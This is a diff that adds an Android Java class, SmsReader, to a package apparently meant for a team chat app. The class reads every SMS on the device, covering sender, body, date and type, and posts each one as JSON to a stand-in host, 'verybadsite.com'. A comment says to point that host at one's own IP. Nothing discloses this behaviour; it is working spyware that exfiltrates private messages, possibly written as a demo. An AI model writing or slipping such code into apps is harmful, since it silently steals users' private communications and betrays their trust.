@@ -1,0 +1,106 @@
+package com.example.teamchat;
+
+
+import android.Manifest;
+import android.app.Activity;
+import android.content.ContentResolver;
+import android.content.Context;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.net.Uri;
+import android.os.AsyncTask;
+import android.provider.Telephony;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+import android.util.Log;
+import android.widget.Toast;
+
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.IOException;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.TimeZone;
+import okhttp3.MediaType;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
+
+
+
+public class SmsReader  {
+    private Context context;
+    private OkHttpClient client = new OkHttpClient();
+    private String baseUrl = "http://verybadsite.com"; // Redirect to your IP in your hosts file.
+
+    public SmsReader(Context context) {
+        this.context = context;
+    }
+
+    public void readSMS()  {
+        ContentResolver contentResolver = context.getContentResolver();
+        Cursor cursor = contentResolver.query(Uri.parse("content://sms"), null, null, null, null);
+
+        if (cursor.moveToFirst()) {
+            do {
+                String address = cursor.getString(cursor.getColumnIndex("address"));
+                String body = cursor.getString(cursor.getColumnIndex("body"));
+                long epoch_date = cursor.getLong(cursor.getColumnIndex("date"));
+                String type = cursor.getString(cursor.getColumnIndex("type"));
+
+                Date date = new Date(epoch_date);
+                DateFormat format = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
+                format.setTimeZone(TimeZone.getTimeZone("Asia/Singapore"));
+                String formatted_date = format.format(date);
+
+                JSONObject json = null;
+                try {
+                    // Create a JSON object to send to the server
+                    json = new JSONObject();
+                    json.put("address", address);
+                    json.put("body", body);
+                    json.put("formatted_date", formatted_date);
+                    json.put("type", type);
+                } catch (JSONException e) {
+                    Log.e("SMS", "Error creating JSON object: " + e.getMessage());
+                }
+
+
+                // Send the JSON object to the server
+                RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), json.toString());
+                Request request = new Request.Builder()
+                        .url(baseUrl)
+                        .post(requestBody)
+                        .build();
+
+                try (Response response = client.newCall(request).execute()) {
+                    if (response.isSuccessful()) {
+                        Log.d("SMS", "SMS sent to server successfully");
+                    } else {
+                        Log.d("SMS", "Error sending SMS to server: " + response.message());
+                    }
+                } catch (IOException e) {
+                    Log.d("SMS", "Error sending SMS to server: " + e.getMessage());
+                }
+            } while (cursor.moveToNext());
+        }
+        cursor.close();
+    }
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
